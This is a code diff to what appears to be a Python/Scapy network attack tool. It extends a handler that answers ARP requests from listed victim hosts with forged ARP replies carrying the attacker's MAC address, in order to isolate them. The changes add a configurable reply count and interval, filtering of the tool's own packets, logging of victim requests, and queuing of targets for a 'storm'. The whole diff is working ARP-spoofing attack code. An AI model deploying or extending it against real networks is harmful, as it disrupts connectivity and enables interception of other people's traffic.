@@ -6,13 +6,21 @@ from util.dataclasses import Host, Interface
 class IsolationAttackSettings:
     interface: Interface
     victims: list[Host]
+    response_count: int
+    response_interval: int
 
-def handle_packet_isolation(settings: IsolationAttackSettings, packet: Packet):
+def handle_packet_isolation(settings: IsolationAttackSettings, packet: Packet, add_to_storm):
     if ARP not in packet:
+        return
+
+    # Don't act upon our ARP packages
+    if packet[Ether].src == settings.interface.mac_addr:
         return
 
     for victim in settings.victims:
         if victim.ip_addr == packet[ARP].psrc:
+            print(f'Victim sent arp request {packet.summary()}')
+
             response = Ether() / ARP()
             response[Ether].src = settings.interface.mac_addr
             response[Ether].dst = victim.mac_addr
@@ -22,6 +30,7 @@ def handle_packet_isolation(settings: IsolationAttackSettings, packet: Packet):
             response[ARP].hwdst = victim.mac_addr
             response[ARP].op = 2
 
-            sendp(response, verbose=0, iface=settings.interface.name, count=3)
+            add_to_storm((packet[ARP].pdst, victim))
 
+            sendp(response, verbose=0, iface=settings.interface.name, count=settings.response_count)
         return
